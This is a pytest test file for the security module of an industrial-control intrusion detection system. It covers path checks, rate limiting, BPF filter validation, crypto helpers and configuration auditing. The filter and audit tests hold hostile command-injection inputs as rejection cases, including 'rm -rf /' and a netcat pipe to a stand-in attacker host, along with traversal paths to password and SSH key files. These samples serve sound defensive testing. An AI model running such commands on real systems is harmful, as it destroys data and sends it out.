"""
Security tests for SCADA-IDS-KC.
"""

import pytest
import os
import tempfile
import time
from pathlib import Path
from unittest.mock import Mock, patch

from scada_ids.security import (
    SecurityManager, RateLimiter, InputSanitizer, CryptoUtils,
    PrivilegeManager, SecurityAuditor, get_security_manager
)


class TestSecurityManager:
    """Test SecurityManager class."""
    
    def test_initialization(self):
        """Test security manager initialization."""
        manager = SecurityManager()
        assert manager._rate_limiters is not None
        assert manager._access_log is not None
        assert manager._blocked_ips is not None
    
    def test_file_access_validation(self):
        """Test file access validation."""
        manager = SecurityManager()
        
        # Valid paths
        assert manager.check_file_access('config/default.yaml')
        assert manager.check_file_access('models/syn_model.joblib')
        assert manager.check_file_access('./logs/app.log')
        
        # Invalid paths (path traversal)
        assert not manager.check_file_access('../../../etc/passwd')
        assert not manager.check_file_access('../../sensitive_file')
        assert not manager.check_file_access('/etc/shadow')
        assert not manager.check_file_access('/root/.ssh/id_rsa')
    
    def test_network_input_validation(self):
        """Test network input validation."""
        manager = SecurityManager()
        
        # Valid network data
        valid_data = {
            'src_ip': '192.168.1.100',
            'dst_ip': '10.0.0.1',
            'src_port': 12345,
            'dst_port': 80,
            'packet_size': 1500
        }
        assert manager.validate_network_input(valid_data)
        
        # Invalid IP addresses
        invalid_ip_data = {
            'src_ip': '256.1.1.1',  # Invalid IP
            'dst_ip': '192.168.1.1',
            'src_port': 80,
            'dst_port': 443
        }
        assert not manager.validate_network_input(invalid_ip_data)
        
        # Invalid port numbers
        invalid_port_data = {
            'src_ip': '192.168.1.1',
            'dst_ip': '10.0.0.1',
            'src_port': -1,  # Invalid port
            'dst_port': 80
        }
        assert not manager.validate_network_input(invalid_port_data)
        
        # Invalid packet size
        invalid_size_data = {
            'src_ip': '192.168.1.1',
            'dst_ip': '10.0.0.1',
            'packet_size': -100  # Invalid size
        }
        assert not manager.validate_network_input(invalid_size_data)
    
    def test_access_logging(self):
        """Test access logging functionality."""
        manager = SecurityManager()
        
        # Log some access attempts
        manager.log_access('read', 'config.yaml', 'success')
        manager.log_access('write', 'log.txt', 'denied', {'ip': '192.168.1.1'})
        
        # Retrieve log entries
        log_entries = manager.get_access_log()
        assert len(log_entries) == 2
        
        assert log_entries[0]['operation'] == 'read'
        assert log_entries[0]['resource'] == 'config.yaml'
        assert log_entries[0]['result'] == 'success'
        
        assert log_entries[1]['operation'] == 'write'
        assert log_entries[1]['client_info']['ip'] == '192.168.1.1'
    
    def test_rate_limiting(self):
        """Test rate limiting functionality."""
        manager = SecurityManager()
        
        # Should not be rate limited initially
        assert not manager.is_rate_limited('user1', 'login')
        
        # Simulate rate limiter being triggered
        rate_limiter = manager._rate_limiters['user1:login']
        rate_limiter.max_requests = 1
        rate_limiter.allow_request()  # Use up the quota
        
        # Should now be rate limited
        assert manager.is_rate_limited('user1', 'login')


class TestRateLimiter:
    """Test RateLimiter class."""
    
    def test_initialization(self):
        """Test rate limiter initialization."""
        limiter = RateLimiter(max_requests=10, window_seconds=60)
        assert limiter.max_requests == 10
        assert limiter.window_seconds == 60
        assert len(limiter.requests) == 0
    
    def test_allow_request_within_limit(self):
        """Test allowing requests within limit."""
        limiter = RateLimiter(max_requests=3, window_seconds=60)
        
        # Should allow first 3 requests
        assert limiter.allow_request()
        assert limiter.allow_request()
        assert limiter.allow_request()
        
        # Should deny 4th request
        assert not limiter.allow_request()
    
    def test_window_expiration(self):
        """Test request window expiration."""
        limiter = RateLimiter(max_requests=2, window_seconds=1)
        
        # Use up quota
        assert limiter.allow_request()
        assert limiter.allow_request()
        assert not limiter.allow_request()
        
        # Wait for window to expire
        time.sleep(1.1)
        
        # Should allow requests again
        assert limiter.allow_request()


class TestInputSanitizer:
    """Test InputSanitizer class."""
    
    def test_sanitize_filename(self):
        """Test filename sanitization."""
        # Valid filenames
        assert InputSanitizer.sanitize_filename('config.yaml') == 'config.yaml'
        assert InputSanitizer.sanitize_filename('model_v1.joblib') == 'model_v1.joblib'
        
        # Filenames with path traversal
        assert InputSanitizer.sanitize_filename('../../../etc/passwd') == '___etc_passwd'
        assert InputSanitizer.sanitize_filename('../../config') == '__config'
        
        # Filenames with dangerous characters
        assert InputSanitizer.sanitize_filename('file<>name.txt') == 'filename.txt'
        assert InputSanitizer.sanitize_filename('file|name.txt') == 'filename.txt'
        
        # Empty filename
        assert InputSanitizer.sanitize_filename('') == 'default'
        assert InputSanitizer.sanitize_filename(None) == 'default'
        
        # Very long filename
        long_name = 'a' * 300
        sanitized = InputSanitizer.sanitize_filename(long_name)
        assert len(sanitized) <= 255
    
    def test_sanitize_log_message(self):
        """Test log message sanitization."""
        # Normal message
        assert InputSanitizer.sanitize_log_message('Normal log message') == 'Normal log message'
        
        # Message with newlines (log injection attempt)
        malicious = 'User login\nFAKE: Admin access granted'
        sanitized = InputSanitizer.sanitize_log_message(malicious)
        assert '\n' not in sanitized
        assert '\\n' in sanitized
        
        # Message with control characters
        control_chars = 'Message with \x00\x01\x02 control chars'
        sanitized = InputSanitizer.sanitize_log_message(control_chars)
        assert '\x00' not in sanitized
        
        # Very long message
        long_message = 'A' * 2000
        sanitized = InputSanitizer.sanitize_log_message(long_message)
        assert len(sanitized) <= 1000
    
    def test_validate_bpf_filter(self):
        """Test BPF filter validation."""
        # Valid BPF filters
        assert InputSanitizer.validate_bpf_filter('tcp')
        assert InputSanitizer.validate_bpf_filter('tcp and port 80')
        assert InputSanitizer.validate_bpf_filter('host 192.168.1.1')
        assert InputSanitizer.validate_bpf_filter('tcp and tcp[13]=2')
        
        # Invalid BPF filters (command injection attempts)
        assert not InputSanitizer.validate_bpf_filter('tcp; rm -rf /')
        assert not InputSanitizer.validate_bpf_filter('tcp | nc attacker.com 1234')
        assert not InputSanitizer.validate_bpf_filter('tcp && system("malicious")')
        assert not InputSanitizer.validate_bpf_filter('exec("evil_command")')
        
        # Empty or too long filters
        assert not InputSanitizer.validate_bpf_filter('')
        assert not InputSanitizer.validate_bpf_filter('x' * 2000)


class TestCryptoUtils:
    """Test CryptoUtils class."""
    
    def test_generate_secure_token(self):
        """Test secure token generation."""
        token1 = CryptoUtils.generate_secure_token()
        token2 = CryptoUtils.generate_secure_token()
        
        # Tokens should be different
        assert token1 != token2
        
        # Default length should be 64 characters (32 bytes hex)
        assert len(token1) == 64
        
        # Custom length
        short_token = CryptoUtils.generate_secure_token(16)
        assert len(short_token) == 32  # 16 bytes = 32 hex chars
    
    def test_hash_data(self):
        """Test data hashing."""
        data = "sensitive_password"
        
        # Hash with auto-generated salt
        hashed1 = CryptoUtils.hash_data(data)
        hashed2 = CryptoUtils.hash_data(data)
        
        # Hashes should be different due to different salts
        assert hashed1 != hashed2
        
        # Both should contain salt and hash
        assert ':' in hashed1
        assert ':' in hashed2
        
        # Hash with specific salt
        salt = "fixed_salt"
        hashed_with_salt = CryptoUtils.hash_data(data, salt)
        assert hashed_with_salt.startswith(salt + ':')
    
    def test_verify_hash(self):
        """Test hash verification."""
        data = "test_password"
        hashed = CryptoUtils.hash_data(data)
        
        # Correct data should verify
        assert CryptoUtils.verify_hash(data, hashed)
        
        # Wrong data should not verify
        assert not CryptoUtils.verify_hash("wrong_password", hashed)
        
        # Malformed hash should not verify
        assert not CryptoUtils.verify_hash(data, "malformed_hash")
    
    def test_secure_compare(self):
        """Test constant-time string comparison."""
        string1 = "secret_value"
        string2 = "secret_value"
        string3 = "different_value"
        
        # Same strings should compare equal
        assert CryptoUtils.secure_compare(string1, string2)
        
        # Different strings should not compare equal
        assert not CryptoUtils.secure_compare(string1, string3)


class TestPrivilegeManager:
    """Test PrivilegeManager class."""
    
    @patch('os.geteuid')
    @patch('sys.platform', 'linux')
    def test_check_admin_privileges_unix(self, mock_geteuid):
        """Test admin privilege check on Unix."""
        # Root user
        mock_geteuid.return_value = 0
        assert PrivilegeManager.check_admin_privileges()
        
        # Regular user
        mock_geteuid.return_value = 1000
        assert not PrivilegeManager.check_admin_privileges()
    
    @patch('ctypes.windll.shell32.IsUserAnAdmin')
    @patch('sys.platform', 'win32')
    def test_check_admin_privileges_windows(self, mock_is_admin):
        """Test admin privilege check on Windows."""
        # Administrator
        mock_is_admin.return_value = 1
        assert PrivilegeManager.check_admin_privileges()
        
        # Regular user
        mock_is_admin.return_value = 0
        assert not PrivilegeManager.check_admin_privileges()
    
    def test_check_network_privileges(self):
        """Test network privilege check."""
        with patch.object(PrivilegeManager, 'check_admin_privileges', return_value=True):
            assert PrivilegeManager.check_network_privileges()
        
        with patch.object(PrivilegeManager, 'check_admin_privileges', return_value=False):
            assert not PrivilegeManager.check_network_privileges()


class TestSecurityAuditor:
    """Test SecurityAuditor class."""
    
    def test_initialization(self):
        """Test security auditor initialization."""
        auditor = SecurityAuditor()
        assert auditor.findings == []
    
    def test_audit_configuration(self):
        """Test configuration auditing."""
        auditor = SecurityAuditor()
        
        # Secure configuration
        secure_config = {
            'debug_mode': False,
            'logging': {'log_level': 'INFO'},
            'network': {'bpf_filter': 'tcp and tcp[13]=2'},
            'detection': {
                'model_path': 'models/syn_model.joblib',
                'scaler_path': 'models/syn_scaler.joblib'
            }
        }
        
        findings = auditor.audit_configuration(secure_config)
        # Should have minimal or no findings
        high_severity = [f for f in findings if f['severity'] == 'high']
        assert len(high_severity) == 0
        
        # Insecure configuration
        insecure_config = {
            'debug_mode': True,  # Security issue
            'logging': {'log_level': 'DEBUG'},  # Verbose logging
            'network': {'bpf_filter': 'tcp; rm -rf /'},  # Dangerous filter
            'detection': {
                'model_path': '../../../etc/passwd',  # Path traversal
                'scaler_path': '/root/secret_file'
            }
        }
        
        findings = auditor.audit_configuration(insecure_config)
        assert len(findings) > 0
        
        # Should have high severity findings
        high_severity = [f for f in findings if f['severity'] == 'high']
        assert len(high_severity) > 0
    
    def test_generate_security_report(self):
        """Test security report generation."""
        auditor = SecurityAuditor()
        
        config = {
            'debug_mode': True,
            'logging': {'log_level': 'DEBUG'}
        }
        
        report = auditor.generate_security_report(config)
        
        assert 'timestamp' in report
        assert 'total_findings' in report
        assert 'severity_counts' in report
        assert 'findings' in report
        assert 'recommendations' in report
        
        assert report['total_findings'] > 0
        assert len(report['recommendations']) > 0


class TestGlobalFunctions:
    """Test global security functions."""
    
    def test_get_security_manager_singleton(self):
        """Test that get_security_manager returns singleton."""
        manager1 = get_security_manager()
        manager2 = get_security_manager()
        assert manager1 is manager2


@pytest.mark.integration
class TestSecurityIntegration:
    """Integration tests for security components."""
    
    def test_file_access_with_temp_files(self):
        """Test file access validation with real files."""
        manager = SecurityManager()
        
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            
            # Create test file in temp directory
            test_file = temp_path / "test_config.yaml"
            test_file.write_text("test: value")
            
            # Should allow access to file in temp directory
            assert manager.check_file_access(str(test_file))
            
            # Should not allow access to parent directory traversal
            parent_file = temp_path.parent / "sensitive_file"
            assert not manager.check_file_access(str(parent_file))
    
    def test_rate_limiting_integration(self):
        """Test rate limiting with real timing."""
        limiter = RateLimiter(max_requests=2, window_seconds=1)
        
        # Use up quota
        assert limiter.allow_request()
        assert limiter.allow_request()
        assert not limiter.allow_request()
        
        # Wait for window to reset
        time.sleep(1.1)
        
        # Should allow requests again
        assert limiter.allow_request()
    
    def test_crypto_operations_integration(self):
        """Test cryptographic operations integration."""
        # Test multiple hash/verify cycles
        test_data = ["password1", "secret_key", "user_token"]
        
        for data in test_data:
            hashed = CryptoUtils.hash_data(data)
            assert CryptoUtils.verify_hash(data, hashed)
            assert not CryptoUtils.verify_hash(data + "wrong", hashed)
    
    def test_security_audit_integration(self):
        """Test complete security audit workflow."""
        auditor = SecurityAuditor()
        
        # Test with various configuration scenarios
        configs = [
            {'debug_mode': False, 'logging': {'log_level': 'INFO'}},  # Secure
            {'debug_mode': True, 'logging': {'log_level': 'DEBUG'}},  # Insecure
        ]
        
        for config in configs:
            report = auditor.generate_security_report(config)
            
            assert isinstance(report, dict)
            assert 'findings' in report
            assert 'recommendations' in report
            assert isinstance(report['findings'], list)
            assert isinstance(report['recommendations'], list)
